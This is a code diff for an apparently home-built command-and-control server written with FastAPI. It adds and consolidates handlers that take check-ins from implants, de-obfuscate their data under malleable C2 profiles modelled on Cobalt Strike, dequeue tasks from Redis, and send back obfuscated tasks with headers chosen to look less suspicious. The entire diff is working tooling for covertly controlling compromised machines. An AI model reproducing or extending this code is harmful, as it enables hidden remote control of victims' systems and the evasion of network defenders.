@@ -379,9 +379,54 @@ async def http_get(request: Request) -> Response:
         print(e)
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
-    """
-    Setup a response for the implant
+    response = http_response(data_from_implant=data_from_implant)
+    return response
 
+
+async def http_get_uri(request: Request) -> Response:
+    """
+    Same as the http_get method, but URI specific, as that requires extra handling on the fastapi
+    side.
+    """
+    try:
+        print(request)
+        path = request.url.path
+        print("Full path:", path)
+
+        # Last segment
+        data_in_uri = path.rstrip("/").split("/")[-1]
+        print("Last data_in_uri:", data_in_uri)
+    except Exception as e:
+        print(e)
+        raise HTTPException(status_code=400, detail="Invalid or malformed client data")
+
+    # we can assume URI terminator is uri-append.
+    # data is the /someendpoint/<HERE>, so we just need to grab it, and transform it.
+
+    hce = HttpGetBlockClientParser(client_block=mp.http_get.client)
+    try:
+        deobsfucated_data_from_implant = hce.apply_transforms(
+            data=data_in_uri, block_field=mp.http_get.client.metadata
+        )
+        print(f"De-Obsfucated data: {deobsfucated_data_from_implant}")
+        print(f"Data from implant: {data_in_uri}")
+    except Exception as e:
+        print(e)
+        raise HTTPException(status_code=400, detail="Invalid or malformed client data")
+
+    response = http_response(data_from_implant=deobsfucated_data_from_implant)
+    return response
+
+
+def http_response(data_from_implant):
+    """
+    Setup a response for the implant.
+
+
+    Takes the deobsfucated data, and then based on malleable c2, stores data, and then
+    generates a response
+
+    This was defined 2 times beore, so I consolidated the func
     """
 
     # take extracted data, shove into class:
@@ -401,6 +446,9 @@ async def http_get(request: Request) -> Response:
     # | Redis Here >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
     implant_uuid = unpacked_metadata.get("implant_uuid", None)
     check_if_data(implant_uuid)
+
+    print("Warning: implant metadata not currently being stored")
+    # store metadata at all? Maybe a metadata field in agent table, that gets updated (only on change)
 
     its = RedisImplantTaskService(implant_uuid)
     msgpack_task = its.dequeue_task()
@@ -455,96 +503,6 @@ async def http_get(request: Request) -> Response:
             print("Unknown terminator: %r", terminator_type)
             # note still sent headers to make it somewhat less suspicous
             return Response(status_code=500, headers=headers)
-
-
-async def http_get_uri(request: Request) -> Response:
-    """
-    Same as the http_get method, but URI specific, as that requires extra handling on the fastapi
-    side.
-    """
-    try:
-        print(request)
-        path = request.url.path
-        print("Full path:", path)
-
-        # Last segment
-        data_in_uri = path.rstrip("/").split("/")[-1]
-        print("Last data_in_uri:", data_in_uri)
-    except Exception as e:
-        print(e)
-        raise HTTPException(status_code=400, detail="Invalid or malformed client data")
-
-    # we can assume URI terminator is uri-append.
-    # data is the /someendpoint/<HERE>, so we just need to grab it, and transform it.
-
-    hce = HttpGetBlockClientParser(client_block=mp.http_get.client)
-    try:
-        deobsfucated_data_from_implant = hce.apply_transforms(data=data_in_uri)
-        print(f"De-Obsfucated data: {deobsfucated_data_from_implant}")
-        print(f"Data from implant: {data_in_uri}")
-    except Exception as e:
-        print(e)
-        raise HTTPException(status_code=400, detail="Invalid or malformed client data")
-
-    """
-    Setup a response for the implant
-
-    """
-    # take extracted data, shove into class:
-    try:
-        unpacked_metadata = msgpack.unpackb(deobsfucated_data_from_implant)
-        md = Metadata(unpacked_metadata)
-        md.validate()  # , if err return 400 malformed
-    except Exception as e:
-        print(e)
-        raise HTTPException(
-            status_code=status.HTTP_400_BAD_REQUEST,
-            detail=f"Malformed data",
-        )
-
-    # note, payload would need to be inserted somehwere here too.  Ex,
-    # redis lookup for next task -> insert where print it
-    # | Redis Here >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    implant_uuid = unpacked_metadata.get("implant_uuid", None)
-    check_if_data(implant_uuid)
-
-    its = RedisImplantTaskService(implant_uuid)
-    msgpack_task = its.dequeue_task()
-    if not msgpack_task:
-        raise HTTPException(
-            status_code=204  # 204 for no content, but the request suceeded.
-        )
-
-    # pass in block to respective class
-    # get the stuff we need from it
-    emitter = HttpGetBlockServerParser(mp.http_get.server)
-    headers = emitter.headers()
-    obsfucated_task = emitter.generate_data(msgpack_task)
-
-    """
-    Setup a response for the implant
-
-    """
-    # Ex: header: store in header
-    terminator_type, target = emitter.get_output_terminator()
-
-    match terminator_type:
-
-        # case "header":
-        #     # send data in a header
-        #     headers[target] = obsfucated_task
-        #     # construct response here
-
-        case "print":
-            # send data in the body
-            body = obsfucated_task
-            # and construct the response
-            return Response(content=body, headers=headers)
-
-        case _:
-            # unknown terminator
-            print("Unknown terminator: %r", terminator_type)
-            return Response(status_code=500)
 
 
 ###################################
@@ -630,6 +588,78 @@ async def http_post(request: Request) -> Response:
         print(e)
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
+    response = http_post_response(
+        data_from_implant=data_from_implant, implant_uuid=implant_uuid
+    )
+    return response
+
+
+async def http_post_uri(request: Request, data: str) -> Response:
+    """ """
+
+    # we can assume URI terminator is uri-append.
+    # data is the /someendpoint/<HERE>, so we just need to transform it.
+
+    full_uri = str(
+        request.url
+    )  # Full URL including the scheme, host, path, and query params. useful for logging
+
+    try:
+        hce = HttpPostBlockClientParser(client_block=mp.http_post.client)
+        output_terminator_type, output_terminator_key = hce.get_output_terminator()
+
+        # print("output term, output key")
+        # print(output_terminator_type)
+        # print(output_terminator_key)
+        # check if keys, ifnot, throw a 400 (it's a server error though - so maybe change later)
+        check_if_data(output_terminator_type)
+        check_if_data(output_terminator_key)
+
+        data_from_implant = await deobsfucate_malleable_c2_request_data(
+            request=request,
+            terminator_type=output_terminator_type,
+            terminator_key=output_terminator_key,
+            malleable_c2_block=mp.http_post.client,
+            block_field=mp.http_post.client.output,
+            parser_class=HttpPostBlockClientParser,
+        )
+
+    except Exception as e:
+        print(e)
+        raise HTTPException(status_code=400, detail="Invalid or malformed client data")
+
+    try:
+        # note, id is always in a header or param
+        # https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_beacon-http-transaction-walkthru.htm#_Toc65482844
+        id_terminator_type, id_terminator_key = hce.get_id_terminator()
+
+        # print("id term, id key")
+        # print(id_terminator_type)
+        # print(id_terminator_key)
+        # check if keys
+        check_if_data(id_terminator_type)
+        check_if_data(id_terminator_key)
+
+        implant_uuid = await deobsfucate_malleable_c2_request_data(
+            request=request,
+            terminator_type=id_terminator_type,
+            terminator_key=id_terminator_key,
+            malleable_c2_block=mp.http_post.client,
+            block_field=mp.http_post.client.id,
+            parser_class=HttpPostBlockClientParser,
+        )
+        print(f"Implant ID: {implant_uuid}")
+    except Exception as e:
+        print(e)
+        raise HTTPException(status_code=400, detail="Invalid or malformed client data")
+
+    response = http_post_response(
+        data_from_implant=data_from_implant, implant_uuid=implant_uuid
+    )
+    return response
+
+
+def http_post_response(data_from_implant, implant_uuid):
     """
     Setup a response for the implant
 
@@ -639,10 +669,6 @@ async def http_post(request: Request) -> Response:
 
     # get the stuff we need from it
     headers = emitter.headers()
-    # data = emitter.generate_data()
-
-    # data coming in fucekd up, might be my fault:
-    # "c2:implant:b'\\xd3_[kw\\xf4\\xfbO\\x1eo\\xee\\xdc{o\\xbc\\xf7n>\\xdb\\xde\\x9co\\xa79\\xef\\xd7\\x1c':tasks:inbox"
 
     # spin up redis class, write deobsfucated data to redis.
     # this will get picked up by the redis batch watchdog and write to mysql
@@ -690,45 +716,6 @@ async def http_post(request: Request) -> Response:
             print("Unknown terminator: %r", terminator_type)
             # note still sent headers to make it somewhat less suspicous
             return Response(status_code=500, headers=headers)
-
-
-async def http_post_uri(request: Request, data: str) -> Response:
-    """ """
-
-    # we can assume URI terminator is uri-append.
-    # data is the /someendpoint/<HERE>, so we just need to transform it.
-
-    full_uri = str(
-        request.url
-    )  # Full URL including the scheme, host, path, and query params. useful for logging
-
-    try:
-        hce = HttpPostBlockClientParser(client_block=mp.http_post.client)
-        print(f"De-Obsfucated data: {hce.apply_transforms(data=data)}")
-
-        print(f"Full URL: {full_uri}")
-        print(f"Data from URL: {data}")
-    except Exception as e:
-        print(e)
-        raise HTTPException(status_code=400, detail="Invalid or malformed client data")
-
-    # save to redis...
-    # generate response...
-
-    """
-    Setup a response for the implant
-
-    """
-
-    # pass in block to respective class
-    emitter = HttpPostBlockServerParser(mp.http_post.server)
-
-    # get the stuff we need from it
-    headers = emitter.headers()
-    data = emitter.generate_data()
-
-    # note, payload would need to be inserted somehwere here too.  Ex,
-    # redis lookup for next task -> insert where print it
 
 
 ###################################
